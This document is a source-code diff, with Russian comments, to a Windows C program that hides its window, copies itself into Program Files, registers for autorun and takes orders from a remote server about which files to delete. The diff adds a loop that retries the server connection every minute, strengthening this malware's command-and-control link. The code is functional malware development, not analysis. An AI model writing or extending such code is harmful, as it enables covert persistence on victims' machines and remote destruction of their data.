@@ -14,11 +14,13 @@
 #define MAX_PATH_LENGTH 500
 #define SYSTEM_DIRECTORY "C:\\Program Files\\"
 #define PROGRAM_NAME "Socket"
+#define SLEEP_TIME (60 * 1000)
 
 void initWinsock();
 SOCKADDR_IN createServer();
 char* copyFileToSystemDirectory();
 void addProgramToAutorun(char* pathToProgram);
+SOCKET getEstablishConnection(SOCKADDR_IN server);
 
 int main(int argc, char* argv[]) {
 	// Скрыть окно программы
@@ -29,15 +31,7 @@ int main(int argc, char* argv[]) {
 
 	initWinsock();
 	SOCKADDR_IN server = createServer();
-	
-	SOCKET connection = socket(AF_INET, SOCK_STREAM, NULL);
-	if (connect(connection, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
-		puts("Connect failed");
-		exit(WSAGetLastError());
-	}
-	else {
-		puts("Connected");
-	}
+	SOCKET connection = getEstablishConnection(server);
 
 	// Ждем информации от сервера в бесконечном цикле, поскольку именно сервер решает, сколько файлов надо будет удалять
 	while (1) {
@@ -70,6 +64,16 @@ void initWinsock() {
 		puts("Winsock library load error");
 		exit(1);
 	}
+}
+
+SOCKET getEstablishConnection(SOCKADDR_IN server) {
+	SOCKET connection = socket(AF_INET, SOCK_STREAM, NULL);
+	while(connect(connection, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
+		Sleep(SLEEP_TIME);
+	}
+	puts("Connected");
+
+	return connection;
 }
 
 SOCKADDR_IN createServer() {
